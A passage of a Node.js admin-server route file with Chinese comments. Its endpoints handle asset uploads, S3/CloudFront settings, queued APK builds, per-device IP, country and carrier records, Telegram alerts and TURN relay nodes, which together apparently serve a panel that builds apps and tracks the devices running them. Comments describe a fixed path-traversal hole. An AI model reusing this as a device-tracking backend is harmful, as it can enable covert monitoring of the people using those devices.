    const out = [];
    for (const f of fs.readdirSync(dir)) {
      try { if (fs.statSync(path.join(dir, f)).isFile()) out.push({name: f, url: `/m/assets/${p.atype}/${f}`}); } catch (e) {}
    }
    ctx.ok(res, {data: out});   // 前端取 .data 字段（裸数组会显示为空）
  });
  on('POST', '/m/upload/asset/:atype', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const ct = req.headers['content-type'] || '';
    const bm = /boundary=(.+)$/.exec(ct);
    const raw = (b && b.__multipart) || null;      // server.js readBody 已消费流，从 body 取
    if (!raw || !bm) return ctx.bad(res, '未收到文件');
    try {
      const fp = parseMultipart(raw, bm[1]).find(x => x.filename && x.data);
      if (!fp) return ctx.bad(res, '未收到文件');
      const safe = fp.filename.replace(/[^\w.-]/g, '');
      if (!safe) return ctx.bad(res, '未收到文件');
      // atype 穿越清洗：decodeURIComponent 后可能携带 ../，basename 后仍需显式拒绝 '..'
      const at = path.basename(String(p.atype || ''));
      if (!at || at === '..') return ctx.bad(res, '路径非法');
      fs.mkdirSync(path.join(UPLOAD_DIR, at), {recursive: true});
      fs.writeFileSync(path.join(UPLOAD_DIR, at, safe), fp.data);
      ctx.json(res, {success: true, url: `/m/assets/${at}/${safe}`, name: safe});
    } catch (e) { ctx.bad(res, '上传失败'); }
  });
  on(['GET', 'DELETE'], '/m/assets/:atype/:name', (req, res, ctx, p) => {
    // 穿越修复：match() 会对路径参数 decodeURIComponent（'..%2F..' → '../..'），
    // 原实现直接 path.join 可越出 uploads 读任意文件（曾实测无鉴权拉走整个数据库）。
    // basename 后 '..' 仍然有效，需显式拒绝；最终路径必须仍在 uploads 目录内。
    const safeAtype = path.basename(String(p.atype || ''));
    const safeName = path.basename(String(p.name || ''));
    if (!safeAtype || !safeName || safeAtype === '..' || safeName === '..') return ctx.bad(res, '不存在', 404);
    const fp = path.join(UPLOAD_DIR, safeAtype, safeName);
    if (!fp.startsWith(UPLOAD_DIR + path.sep)) return ctx.bad(res, '不存在', 404);
    if (req.method === 'GET') {
      if (fs.existsSync(fp) && fs.statSync(fp).isFile()) return ctx.file(res, fp);
      return ctx.bad(res, '不存在', 404);
    }
    if (!A(req, res)) return;
    if (fs.existsSync(fp)) fs.unlinkSync(fp);
    ctx.okt(res);
  });
  on(['GET', 'POST'], '/m/cdn-config', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'GET') {
      const cfgs = gList(ctx.db, 'cdn_config');
      return ctx.json(res, {success: true, config: cfgs[0] || {bucket: '', region: '', accessKey: '', secretKey: '', endpoint: '', cloudFrontDomain: '', keyPrefix: 'apk/'}});
    }
    gAdd(ctx.db, 'cdn_config', b);
    ctx.json(res, {success: true});
  });
  on('POST', '/m/cdn-test', async (req, res, ctx) => {
    if (!A(req, res)) return;
    const cfg = gList(ctx.db, 'cdn_config')[0] || {};
    if (!cfg.bucket || !cfg.accessKey) return ctx.json(res, {success: false, error: 'CDN 未配置：请先填写 Bucket 与 AccessKey'});
    const region = String(cfg.region || 'ap-southeast-1').replace(/^.*\(([^)]+)\).*$/, '$1').slice(0, 30);
    // 真实连通性测试：HEAD S3 桶端点（私有桶返回 403 = 桶存在且拒绝匿名 = 连接正常）
    const head = (url) => new Promise(r => {
      const ac = new AbortController();
      const t = setTimeout(() => ac.abort(), 8000);
      fetch(url, {method: 'HEAD', signal: ac.signal})
        .then(x => { clearTimeout(t); r({ok: true, status: x.status}); })
        .catch(e => { clearTimeout(t); r({ok: false, err: (e && e.name === 'AbortError' ? '超时' : String(e).slice(0, 60))}); });
    });
    const s3 = await head(`https://${cfg.bucket}.s3.${region}.amazonaws.com/`);
    let cf = null;
    if (cfg.cloudFrontDomain) cf = await head('https://' + String(cfg.cloudFrontDomain).replace(/^https?:\/\//, '') + '/');
    if (!s3.ok && (!cf || !cf.ok))
      return ctx.json(res, {success: false, error: `连接失败：S3 ${s3.err || s3.status}${cf ? '；CloudFront ' + (cf.err || cf.status) : ''}`});
    const s3Txt = s3.ok ? `可达(${s3.status})` : `不可达(${s3.err || s3.status})`;
    const cfTxt = cf ? (cf.ok ? `可达(${cf.status})` : `不可达(${cf.err || cf.status})`) : '未配置';
    ctx.json(res, {success: true, message: `连接正常 — S3 ${s3Txt}，CloudFront ${cfTxt}`});
  });
  on(['GET', 'POST'], '/m/abuild/config', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'GET') {
      const cfgs = gList(ctx.db, 'abuild_config');
      return ctx.json(res, {data: cfgs[0] || {enabled: false, interval_minutes: 0}});
    }
    gAdd(ctx.db, 'abuild_config', b);
    ctx.json(res, {ok: true, data: b});
  });
  on(['GET', 'POST'], '/m/abuild/targets', (req, res, ctx, p, b) => A(req, res) && (req.method === 'GET' ? ctx.ok(res, gList(ctx.db, 'abuild_targets')) : ctx.ok(res, gAdd(ctx.db, 'abuild_targets', b))));
  on(['PUT', 'DELETE'], '/m/abuild/targets/:tid', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'DELETE') { gDel(ctx.db, 'abuild_targets', p.tid); return ctx.okt(res); }
    ctx.ok(res, gAdd(ctx.db, 'abuild_targets', {...b, id: p.tid}));
  });
  on('POST', '/m/abuild/targets/:tid/trigger', (req, res, ctx, p) => {
    if (!A(req, res)) return;
    const t = gList(ctx.db, 'abuild_targets').find(x => String(x.id) === String(p.tid));
    if (!t) return ctx.bad(res, '目标不存在', 404);
    const bid = uid();
    gAdd(ctx.db, 'builds', {id: bid, app_label: t.app_label || t.name || 'auto-build', package: t.package || '',
      status: 'pending', progress: 0, log: [`[*] 自动构建触发（目标: ${p.tid}），已入队等待构建工人`], created_at: new Date().toISOString().slice(0, 19) + 'Z'});
    ctx.json(res, {ok: true, build_id: bid});
  });

  // ---- locations / locale / security / telegram / turn ----
  on('GET', '/m/locations', (req, res, ctx) => {
    if (!A(req, res)) return;
    const mine = myDevIds(authInfo(req));
    const locs = ctx.db.prepare("SELECT data FROM devices").all().map(r => {
      const d = JSON.parse(r.data);
      return {device_id: d.id, ip: d.ip, country: d.country, carrier: d.carrier, last_seen: d.last_seen || d.first_seen};
    }).filter(x => !mine || mine.has(String(x.device_id)));
    ctx.ok(res, locs);
  });
  on(['GET', 'POST'], '/m/locale', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'GET') {
      const r = ctx.db.prepare("SELECT v FROM kv WHERE k='locale'").get();
      return ctx.ok(res, r ? JSON.parse(r.v) : {locale: 'zh-CN'});
    }
    ctx.db.prepare("INSERT OR REPLACE INTO kv VALUES('locale',?)").run(j(b));
    ctx.okt(res);
  });
  on(['GET', 'POST'], '/m/security/ip-whitelist', (req, res, ctx, p, b) => A(req, res) && (req.method === 'GET' ? ctx.ok(res, gList(ctx.db, 'ip_whitelist')) : ctx.ok(res, gAdd(ctx.db, 'ip_whitelist', b))));
  on(['PUT', 'DELETE'], '/m/security/ip-whitelist/:iid', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'DELETE') { gDel(ctx.db, 'ip_whitelist', p.iid); return ctx.okt(res); }
    ctx.ok(res, gAdd(ctx.db, 'ip_whitelist', {...b, id: p.iid}));
  });
  on(['GET', 'DELETE'], '/m/security/login-attempts', (req, res, ctx, p, b, q) => {
    if (!A(req, res)) return;
    if (req.method === 'DELETE') { ctx.db.prepare("DELETE FROM generic WHERE store='login_attempts'").run(); secLog(ctx.db, '警告', '清空登录记录'); return ctx.okt(res); }
    ctx.ok(res, pageList(gList(ctx.db, 'login_attempts'), q, r => !q.status || q.status === 'all' || (q.status === 'success' ? r.success : !r.success)));
  });
  on(['GET', 'DELETE'], '/m/security/logs', (req, res, ctx, p, b, q) => {
    if (!A(req, res)) return;
    if (req.method === 'DELETE') { ctx.db.prepare("DELETE FROM generic WHERE store='security_logs'").run(); return ctx.okt(res); }
    ctx.ok(res, pageList(gList(ctx.db, 'security_logs'), q, r => !q.level || r.level === q.level));
  });
  // ---- Telegram 机器人（tgbot.js：真实发送 + 绑定流程 + 事件通知） ----
  on('GET', '/m/telegram/status', (req, res, ctx) => {
    if (!A(req, res)) return;
    const r = ctx.db.prepare("SELECT v FROM kv WHERE k='tg_config'").get();
    const c = r ? JSON.parse(r.v) : {};
    ctx.ok(res, {bound: !!(c.bot_token && c.chat_id), chat_id: c.chat_id || ''});
  });
  on('POST', '/m/telegram/bind-request', async (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const r = await ctx.tg.bindRequest(b && b.chat_id);
    if (!r.ok) return ctx.bad(res, r.error, 400);
    ctx.json(res, {ok: true});
  });
  on('POST', '/m/telegram/bind-confirm', async (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const r = await ctx.tg.bindConfirm(b && (b.code || b.verification_code));
    if (!r.ok) return ctx.bad(res, r.error, 400);
    ctx.json(res, {ok: true, chat_id: r.chat_id});
  });
  on('POST', '/m/telegram/unbind', (req, res, ctx) => A(req, res) && ctx.json(res, ctx.tg.unbind()));
  on('GET', '/m/tg', (req, res, ctx) => {
    if (!A(req, res)) return;
    const r = ctx.db.prepare("SELECT v FROM kv WHERE k='tg_config'").get();
    ctx.ok(res, r ? JSON.parse(r.v) : {});
  });
  on(['GET', 'POST', 'PUT'], '/m/tg/config', async (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'GET') {
      const r = ctx.db.prepare("SELECT v FROM kv WHERE k='tg_config'").get();
      return ctx.ok(res, r ? JSON.parse(r.v) : {});
    }
    // 保存前校验 bot_token（getMe）：无效 token 直接报错，不给假成功
    if (b && b.bot_token && ctx.tg.validateToken) {
      const me = await ctx.tg.validateToken(b.bot_token, b.api_proxy);
      if (me.ok === false) return ctx.bad(res, 'Bot Token 无效: ' + (me.error || me.description || ''), 400);
    }
    ctx.db.prepare("INSERT OR REPLACE INTO kv VALUES('tg_config',?)").run(j(b));
    ctx.okt(res);
  });
  on('POST', '/m/tg/test', async (req, res, ctx) => {
    if (!A(req, res)) return;
    const r = await ctx.tg.test();
    if (!r.ok) return ctx.bad(res, r.error, 400);
    ctx.json(res, r);
  });
  on('GET', '/m/turn-nodes', (req, res, ctx) => A(req, res) && ctx.ok(res, gList(ctx.db, 'turn_nodes')));
  on(['PUT', 'DELETE'], '/m/turn-node/:nid', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'DELETE') { gDel(ctx.db, 'turn_nodes', p.nid); return ctx.okt(res); }
    ctx.ok(res, gAdd(ctx.db, 'turn_nodes', {...b, id: p.nid}));
  });

  // ---- ping ----
  on(['GET', 'POST'], '/m/ping', (req, res, ctx) => ctx.ok(res, {pong: true, ts: Math.floor(Date.now() / 1000)}));
  on(['GET', 'POST'], '/m/heartbeat', (req, res, ctx) => ctx.json(res, {ok: true}));
}

function match(routeParts, pathParts) {
  if (routeParts.length !== pathParts.length) return null;
  const params = {};
  for (let i = 0; i < routeParts.length; i++) {
    const rp = routeParts[i];
    if (rp.startsWith(':')) params[rp.slice(1)] = decodeURIComponent(pathParts[i]);
    else if (rp !== pathParts[i]) return null;
  }
  return params;
}

module.exports = {register, routes: R, match, getDevice, setDevice, gList, gAdd, gDel, sanD, findBuild, ADMIN: () => [ADMIN_USER, ADMIN_PASS]};
